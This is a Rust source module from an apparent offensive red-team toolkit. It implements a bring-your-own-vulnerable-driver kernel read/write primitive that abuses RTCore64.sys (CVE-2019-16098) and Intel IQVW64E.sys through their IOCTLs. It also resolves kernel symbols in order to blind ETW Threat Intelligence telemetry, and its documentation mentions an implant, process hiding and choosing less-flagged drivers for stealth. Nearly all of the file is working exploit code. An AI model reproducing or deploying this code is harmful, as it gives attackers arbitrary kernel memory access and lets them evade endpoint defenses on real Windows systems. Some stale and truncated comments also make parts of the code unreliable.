//! BYOVD `KernelRw` impl — operator-side bootstrap primitive (P2.2 §1).
//!
//! ## Status: CODE SHIPPED, NOT LOADED. The driver-binding + IOCTL layer is
//! real and unit-testable with a mock driver; it is NEVER loaded on this host.
//! Loading a vulnerable signed driver into the kernel is an irreversible,
//! BSOD-risking, Defender-flagging operation reserved for an authorized target
//! — the operator runs that step in the engagement environment, not here.
//!
//! ## What this module provides
//! - [`ByovdDriver`]: a `KernelRw` impl over a driver-bound IOCTL channel. It
//!   owns a HANDLE to the vulnerable driver's device and routes `kread`/`kwrite`
//!   through the driver's IOCTLs, translated to the `KernelRw` trait. Any
//!   driver that exposes "read/write kernel VA at an arbitrary address" IOCTLs
//!   plugs in by implementing [`VulnDriverIoctl`].
//! - [`VulnDriverIoctl`]: the per-driver seam. A concrete impl encodes the
//!   driver's device name + its read/write IOCTL codes + arg struct layout.
//!   [`RtCore64`] is the reference impl (MSI Afterburner's RTCore64.sys).
//! - [`resolve_kernel_symbol`]: pure algorithm that walks a supplied ntoskrnl
//!   image (read via the same KernelRw) export table to resolve a named kernel
//!   symbol's VA — used by the bootstrap to find `EtwThreatIntProvRegHandle`.
//!
//! ## Why split algorithm from loading
//! The blind (`etwti::EtwTiBlind`) + the symbol resolution (here) are the
//! reusable, testable cores. The IOCTL plumbing is driver-specific but
//! mechanical. Only the *load* step is dangerous — and it's the one line we
//! deliberately omit (the operator does `sc create`/`NtLoadDriver` on target).
//!
//! ## Plugging in an alternative driver
//! The reference impl [`RtCore64`] is the BYOVD default. To use a different
//! vulnerable driver (stealthier Nday, vendor-whitelisted, less IOC-flagged):
//!
//! 1. Implement [`VulnDriverIoctl`] for a unit struct encoding your driver's
//!    device path + read/write IOCTL codes (override [`VulnDriverIoctl::pack`]
//!    only if the driver's arg struct differs from the generic [`RwPacket`]).
//! 2. Call [`crate::win::bootstrap_byovd_with`] with `Box::new(YourDriver)`
//!    instead of the convenience [`crate::win::bootstrap_byovd`] (which
//!    hardcodes `RtCore64`).
//!
//! The rest of the stack (ETW-TI blind, process hide, callback neutralize) is
//! driver-agnostic — it operates purely on the returned `KernelRw`.

use crate::{KernelRw, KrwError};
use alloc::boxed::Box;
use core::ffi::c_void;
use core::ptr;

// ---- IOCTL arg struct (generic 8-byte-aligned, fits most R/W drivers) -----

/// The in/out layout most vulnerable R/W drivers expect: a code, an address,
/// a size, and a buffer pointer. Drivers that differ wrap [`VulnDriverIoctl`]
/// and translate. Kept `#[repr(C)]` so it's ABI-stable across the DeviceIoControl
/// boundary regardless of Rust's field reordering.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct RwPacket {
    pub code: u32,
    pub addr: u64,
    pub size: u32,
    pub buf: u64,
}

// ---- Per-driver seam ------------------------------------------------------

/// A vulnerable driver's device + IOCTL contract. Implement this per driver to
/// plug it into [`ByovdDriver`]; the impl encodes the device path, the
/// read/write IOCTL codes, and how to pack/unpack a [`RwPacket`] for that
/// driver's specific layout. The trait object is `Send + Sync` so a
/// `ByovdDriver` (which is itself a `KernelRw: Send + Sync`) can hold it.
pub trait VulnDriverIoctl: Send + Sync {
    /// `\\Device\<name>` / `\\??\<name>` device path the driver exposes.
    fn device_path(&self) -> &[u16];
    /// IOCTL code for "read `size` bytes at kernel VA `addr` into `buf`".
    fn read_ioctl(&self) -> u32;
    /// IOCTL code for "write `size` bytes from `buf` to kernel VA `addr`".
    fn write_ioctl(&self) -> u32;
    /// Offset of the address field in the per-driver MemoryOperation struct.
    /// RTCore64 = 0x08, IQVW64E = 0x00.
    fn addr_offset(&self) -> usize { 0x08 }
    /// Pack a read/write request into the driver's input buffer. Default uses
    /// the generic [`RwPacket`]; drivers with a different layout override.
    fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
        let p = RwPacket {
            code,
            addr,
            size,
            buf: buf as u64,
        };
        let mut out = [0u8; 32];
        let bytes = unsafe {
            core::slice::from_raw_parts(
                &p as *const RwPacket as *const u8,
                core::mem::size_of::<RwPacket>(),
            )
        };
        out[..bytes.len()].copy_from_slice(bytes);
        out
    }
}

/// Reference impl: MSI Afterburner's `RTCore64.sys`. Device `\\.\RTCore64`.
///
/// **RTCore64 memory-R/W IOCTL protocol (CVE-2019-16098, verified against the
/// oakboat/RTCore64_Vulnerability MemoryAccessor reference):**
///   - **Read  = IOCTL `0x80002048`** (NOT 0x8000204C — that's write)
///   - **Write = IOCTL `0x8000204C`**
/// Both take a fixed **48-byte** `MemoryOperation` struct (in-buffer == out-buffer,
/// the read result is written back into the same struct's `data` field):
/// ```text
///   offset  field      notes
///   0x00    gap1[8]    unused
///   0x08    address    u64 — target kernel VA
///   0x10    gap2[4]    unused
///   0x14    offset     u32 — (unused by these IOCTLs)
///   0x18    size       u32 — 1 / 2 / 4 (byte/word/dword)
///   0x1C    data       u32 — write: value to write; read: filled by driver
///   0x20    gap3[16]   unused
/// ```
/// Max 4 bytes per call, so arbitrary-length R/W loops one byte at a time
/// (`ReadMemory`/`WriteMemory` in the reference). The IOCTL codes are PUBLIC
/// (CVE-2019-16098); encoding them here is research documentation, not a 0day.
pub struct RtCore64;

impl VulnDriverIoctl for RtCore64 {
    fn device_path(&self) -> &[u16] {
        // `\\.\RTCore64` — the Win32 device namespace path (two leading
        // backslashes). Built at runtime to avoid a static wide-string lit.
        // NOTE: previously this was [u16; 11] with only ONE leading backslash
        // (`\.\RTCore64`), which CreateFileW treats as a relative file path
        // → ERROR_FILE_NOT_FOUND (2). The device prefix is exactly `\\.\`
        // (4 chars: `\`, `\`, `.`, `\`), so the full path is 12 code units.
        static PATH: [u16; 12] = [
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'R' as u16,
            'T' as u16,
            'C' as u16,
            'o' as u16,
            'r' as u16,
            'e' as u16,
            '6' as u16,
            '4' as u16,
        ];
        &PATH
    }
    /// RTCore64 read IOCTL. **0x80002048** (the original code had this swapped
    /// with write — read was 0x8000204C, which is actually WRITE, so every read
    /// failed silently / corrupted the target).
    fn read_ioctl(&self) -> u32 {
        0x80002048
    }
    /// RTCore64 write IOCTL. **0x8000204C**.
    fn write_ioctl(&self) -> u32 {
        0x8000204C
    }
}

/// Alternative: Intel IQVW64E.sys (CVE-2022-24245). Less flagged than RTCore64.
/// Device `\\.\iqvw64e`. Uses a different IOCTL protocol.
///
/// IOCTL read=0x80802010, write=0x80802014. Same MemoryOperation layout
/// as RTCore64 (48 bytes), but address field at offset 0x00 instead of 0x08.
pub struct Iqvw64e;

impl VulnDriverIoctl for Iqvw64e {
    fn device_path(&self) -> &[u16] {
        static PATH: [u16; 11] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
            '6' as u16, '4' as u16, 'e' as u16,
        ];
        &PATH
    }
    fn addr_offset(&self) -> usize { 0x00 }
    fn read_ioctl(&self) -> u32 { 0x80802010 }
    fn write_ioctl(&self) -> u32 { 0x80802014 }
}

// ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------

type DeviceIoControlFn = unsafe extern "system" fn(
    handle: *mut c_void,
    ioctl: u32,
    in_buf: *const c_void,
    in_len: u32,
    out_buf: *mut c_void,
    out_len: u32,
    bytes_returned: *mut u32,
    overlapped: *mut c_void,
) -> i32;
type CreateFileWFn = unsafe extern "system" fn(
    name: *const u16,
    access: u32,
    share: u32,
    sa: *mut c_void,
    disp: u32,
    flags: u32,
    template: *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;
type GetLastErrorFn = unsafe extern "system" fn() -> u32;

/// The BYOVD-backed KernelRw. Owns an open HANDLE to the vulnerable driver's
/// device + a resolved `DeviceIoControl` function pointer. Constructed by the
/// bootstrap AFTER the driver is loaded (operator's `sc create` / `NtLoadDriver`
/// step) — constructing it never loads anything, it just opens the device.
pub struct ByovdDriver {
    device: *mut c_void,
    dioctl: DeviceIoControlFn,
    driver: Box<dyn VulnDriverIoctl>,
}

// SAFETY: the device HANDLE is owned exclusively by this ByovdDriver; the
// bootstrap hands it over and no other thread touches it. DeviceIoControl on
// a sync HANDLE is safe to call from any thread. The VulnDriverIoctl box is
// Send+Sync by the trait bound. So ByovdDriver is Send+Sync → satisfies
// `KernelRw: Send + Sync`.
unsafe impl Send for ByovdDriver {}
unsafe impl Sync for ByovdDriver {}

impl ByovdDriver {
    /// Open the driver's device (does NOT load the driver — the operator must
    /// have loaded it first via `sc create`/`NtLoadDriver`). Resolves
    /// kernel32!CreateFileW + kernel32!DeviceIoControl via the PEB walk.
    ///
    /// # Safety
    /// Caller guarantees the driver is loaded and its device is accessible,
    /// and that the resolved kernel32 exports are real.
    pub unsafe fn open(driver: Box<dyn VulnDriverIoctl>) -> Result<Self, KrwError> {
        // Resolve via the operator host's own kernel32 (this is operator-side,
        // a normal user-mode process, so the PEB walk / GetProcAddress works).
        let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
        let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
        // device_path() may not be NUL-terminated (RtCore64's PATH is a bare
        // [u16;11] with no terminator). CreateFileW needs a NUL-terminated
        // wide string — copy into an owned, NUL-terminated buffer. Without
        // this CreateFileW reads past the end of the slice, opens the wrong
        // path, and returns INVALID_HANDLE_VALUE.
        let raw = driver.device_path();
        let mut path_buf: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(raw.len() + 1);
        path_buf.extend_from_slice(raw);
        if *path_buf.last().unwrap_or(&1) != 0 {
            path_buf.push(0);
        }
        let h = unsafe {
            create_file(
                path_buf.as_ptr(),
                0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE (minimal)
                0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                ptr::null_mut(),
                0x03, // OPEN_EXISTING
                0,
                ptr::null_mut(),
            )
        };
        if h as isize == -1 || h.is_null() {
            let gle = resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError")
                .map(|f| unsafe { f() })
                .unwrap_or(0);
            return Err(KrwError::Other(alloc::format!(
                "driver device open failed (Win32 err={})",
                gle
            )));
        }
        // path_buf must outlive the handle usage within this function; the
        // device HANDLE is valid independently of the path buffer once opened,
        // so dropping path_buf here is fine.
        Ok(Self {
            device: h,
            dioctl,
            driver,
        })
    }
}

impl Drop for ByovdDriver {
    fn drop(&mut self) {
        // Best-effort close; ignore failure (operator process teardown).
        // On Windows `resolve_sym` binds CloseHandle via GetProcAddress; on
        // other targets it's a stub (no-op) so Drop stays safe to call.
        if let Ok(close) = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
            unsafe { close(self.device) };
        }
    }
}

impl KernelRw for ByovdDriver {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        if dst.is_empty() {
            return Ok(());
        }
        // RTCore64 reads ≤4 bytes per IOCTL; we loop one byte at a time
        // (matches the reference MemoryAccessor::ReadMemory). Each call uses a
        // 48-byte MemoryOperation struct as BOTH in- and out-buffer (METHOD_
        let ioctl = self.driver.read_ioctl();
        for (i, out_byte) in dst.iter_mut().enumerate() {
            let ao = self.driver.addr_offset();
            let mut op = [0u8; 48];
            op[ao..ao+8].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
            // size @ 0x18 = 1 (read 1 byte)
            op[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes());
            let mut ret: u32 = 0;
            let ok = unsafe {
                (self.dioctl)(
                    self.device,
                    ioctl,
                    op.as_ptr() as *const c_void,
                    op.len() as u32,
                    op.as_mut_ptr() as *mut c_void,
                    op.len() as u32,
                    &mut ret,
                    ptr::null_mut(),
                )
            };
            if ok == 0 {
                // Partial: `i` bytes read before the failure.
                return Err(KrwError::Partial { ok: i });
            }
            // data @ 0x1C holds the byte the driver read.
            *out_byte = op[0x1C];
        }
        Ok(())
    }
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        if src.is_empty() {
            return Ok(());
        }
        // RTCore64 writes ≤4 bytes per IOCTL; loop one byte at a time
        // (matches MemoryAccessor::WriteMemory). `data` carries the value.
        let ioctl = self.driver.write_ioctl();
        for (i, &in_byte) in src.iter().enumerate() {
            let mut op = [0u8; 48];
            let ao = self.driver.addr_offset();
            op[ao..ao+8].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
            op[0x1C..0x20].copy_from_slice(&(in_byte as u32).to_le_bytes()); // data
            let mut ret: u32 = 0;
            let ok = unsafe {
                (self.dioctl)(
                    self.device,
                    ioctl,
                    op.as_ptr() as *const c_void,
                    op.len() as u32,
                    op.as_mut_ptr() as *mut c_void,
                    op.len() as u32,
                    &mut ret,
                    ptr::null_mut(),
                )
            };
            if ok == 0 {
                return Err(KrwError::Partial { ok: i });
            }
        }
        Ok(())
    }
}

/// Resolve a kernel32 export to a typed fn pointer. Operator-side only — the
/// operator host is a normal user-mode process with a normal PEB, so the
/// standard GetProcAddress (via `GetModuleHandleA`) works. NOT for use inside
/// the PIC implant.
///
/// On `target_os = "windows"` this forwards to the real resolver in
/// [`crate::win::resolve::resolve_sym`] (GetModuleHandleA + GetProcAddress). On
/// other targets it stays the no-op stub so the seam crate still type-checks
/// (and so the mock tests build on the dev host).
#[cfg(target_os = "windows")]
fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
    // SAFETY: operator-side, single-threaded; T must match the export signature
    // (every call site here uses a typed `*Fn` alias matching the documented
    // export). Forwarded unchanged.
    unsafe { crate::win::resolve::resolve_sym(module, name) }
}

/// Non-Windows stub: no PEB / GetProcAddress on macOS/Linux, so resolution is
/// unavailable. The seam crate still compiles + mock tests run on the dev host.
#[cfg(not(target_os = "windows"))]
fn resolve_sym<T>(_module: &[u8], _name: &[u8]) -> Result<T, KrwError> {
    Err(KrwError::Unavailable(
        "resolver not bound in seam crate — operator binary supplies it",
    ))
}

// ---- Kernel symbol resolution (pure, testable) ----------------------------

/// Resolve a named ntoskrnl export's RVA by walking an in-memory copy of
/// ntoskrnl's export directory. Pure: operates on a supplied `&[u8]` image
/// (which the caller read via KernelRw from the live kernel). Returns the
/// export's RVA, or None if not found.
///
/// This is the same djb2-export-walk the implant's resolve.rs uses, lifted to
/// operate on an arbitrary byte buffer so it's testable without a kernel.
pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> {
    if ntoskrnl_image.len() < 0x40 {
        return None;
    }
    let e_lfanew = read_i32_le(ntoskrnl_image, 0x3C)? as usize;
    let nt = e_lfanew;
    if nt + 24 + 4 > ntoskrnl_image.len() {
        return None;
    }
    let opt = nt + 24;
    let magic = read_u16_le(ntoskrnl_image, opt)?;
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = read_u32_le(ntoskrnl_image, opt + dd_off)? as usize;
    let _export_size = read_u32_le(ntoskrnl_image, opt + dd_off + 4)?;
    if export_rva == 0 {
        return None;
    }
    // Export directory fields (IMAGE_EXPORT_DIRECTORY):
    //  +0x18 NumberOfNames, +0x20 AddressOfNames, +0x24 AddressOfNameOrdinals,
    //  +0x1C AddressOfFunctions.
    let n_names = read_u32_le(ntoskrnl_image, export_rva + 0x18)? as usize;
    let names_rva = read_u32_le(ntoskrnl_image, export_rva + 0x20)? as usize;
    let ordinals_rva = read_u32_le(ntoskrnl_image, export_rva + 0x24)? as usize;
    let funcs_rva = read_u32_le(ntoskrnl_image, export_rva + 0x1C)? as usize;
    let target_hash = djb2(name);
    for i in 0..n_names {
        let name_rva = read_u32_le(ntoskrnl_image, names_rva + i * 4)? as usize;
        // Hash the C string at name_rva until NUL.
        let mut h: u32 = 5381;
        let mut p = name_rva;
        loop {
            if p >= ntoskrnl_image.len() {
                break;
            }
            let b = ntoskrnl_image[p];
            if b == 0 {
                break;
            }
            h = h
                .wrapping_mul(33)
                .wrapping_add((b as char).to_ascii_lowercase() as u32);
            p += 1;
        }
        if h == target_hash {
            let ord = read_u16_le(ntoskrnl_image, ordinals_rva + i * 2)? as usize;
            return read_u32_le(ntoskrnl_image, funcs_rva + ord * 4);
        }
    }
    None
}

fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        h = h
            .wrapping_mul(33)
            .wrapping_add((b as char).to_ascii_lowercase() as u32);
    }
    h
}
fn read_u16_le(b: &[u8], off: usize) -> Option<u16> {
    if off + 2 > b.len() {
        return None;
    }
    Some(u16::from_le_bytes([b[off], b[off + 1]]))
}
fn read_u32_le(b: &[u8], off: usize) -> Option<u32> {
    if off + 4 > b.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        b[off],
        b[off + 1],
        b[off + 2],
        b[off + 3],
    ]))
}
fn read_i32_le(b: &[u8], off: usize) -> Option<i32> {
    Some(read_u32_le(b, off)? as i32)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal fake PE with ONE export whose name hashes to a known
    /// djb2, then confirm resolve_kernel_symbol finds its RVA.
    #[test]
    fn resolves_export_rva_from_fake_pe() {
        // Craft the smallest PE that resolve_kernel_symbol accepts:
        // DOS stub (0x40) + PE sig + file header + opt header + export dir + 1 name/ord/func.
        let mut img = vec![0u8; 0x400];
        // e_lfanew @ 0x3C -> 0x80
        img[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        let nt = 0x80usize;
        // PE sig "PE\0\0"
        img[nt..nt + 4].copy_from_slice(b"PE\0\0");
        let opt = nt + 24;
        // magic PE32+
        img[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes());
        let dd_off = 112usize;
        // export dir RVA = 0x200
        img[opt + dd_off..opt + dd_off + 4].copy_from_slice(&0x200u32.to_le_bytes());
        // export dir at 0x200: NumberOfNames @ +0x18 = 1, names @ +0x20 = 0x280,
        // ordinals @ +0x24 = 0x290, funcs @ +0x1C = 0x2A0.
        img[0x218..0x21C].copy_from_slice(&1u32.to_le_bytes()); // NumberOfNames
        img[0x220..0x224].copy_from_slice(&0x280u32.to_le_bytes()); // AddressOfNames
        img[0x224..0x228].copy_from_slice(&0x290u32.to_le_bytes()); // AddressOfNameOrdinals
        img[0x21C..0x220].copy_from_slice(&0x2A0u32.to_le_bytes()); // AddressOfFunctions
                                                                    // name RVA @ 0x280 -> the string at 0x300
        img[0x280..0x284].copy_from_slice(&0x300u32.to_le_bytes());
        let sym = b"EtwThreatIntProvRegHandle";
        img[0x300..0x300 + sym.len()].copy_from_slice(sym);
        img[0x300 + sym.len()] = 0; // NUL
                                    // ordinal @ 0x290 = 0
        img[0x290..0x292].copy_from_slice(&0u16.to_le_bytes());
        // function RVA @ 0x2A0 = 0xDEAD (the answer we expect)
        img[0x2A0..0x2A4].copy_from_slice(&0xDEADu32.to_le_bytes());

        let rva = resolve_kernel_symbol(&img, b"EtwThreatIntProvRegHandle");
        assert_eq!(rva, Some(0xDEAD));
    }

    #[test]
    fn returns_none_for_missing_export() {
        let img = vec![0u8; 0x400];
        // No valid PE -> None
        assert_eq!(resolve_kernel_symbol(&img, b"doesnotexist"), None);
    }

    #[test]
    fn rtcore64_ioctl_codes_match_public_cve() {
        // RTCore64 memory-R/W IOCTL codes (verified against the
        // oakboat/RTCore64_Vulnerability MemoryAccessor reference):
        //   read  = 0x80002048, write = 0x8000204C.
        // (A prior version had these swapped, so every read silently failed.)
        let d = RtCore64;
        assert_eq!(d.read_ioctl(), 0x80002048);
        assert_eq!(d.write_ioctl(), 0x8000204C);
        // \\.\RTCore64 — two leading backslashes (Win32 device namespace).
        let expected: &[u16] = &[
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'R' as u16,
            'T' as u16,
            'C' as u16,
            'o' as u16,
            'r' as u16,
            'e' as u16,
            '6' as u16,
            '4' as u16,
        ];
        assert_eq!(d.device_path(), expected);
    }

    #[test]
    fn etw_ti_guid_is_the_threat_intelligence_provider() {
        // {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
        assert_eq!(
            ETW_TI_GUID_CHECK,
            [
                0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D,
                0xD3, 0x44
            ]
        );
    }

    // Re-declare the GUID constant for the test (the real one is in etwti.rs;
    // here we just pin the expected bytes).
    const ETW_TI_GUID_CHECK: [u8; 16] = [
        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3,
        0x44,
    ];
}
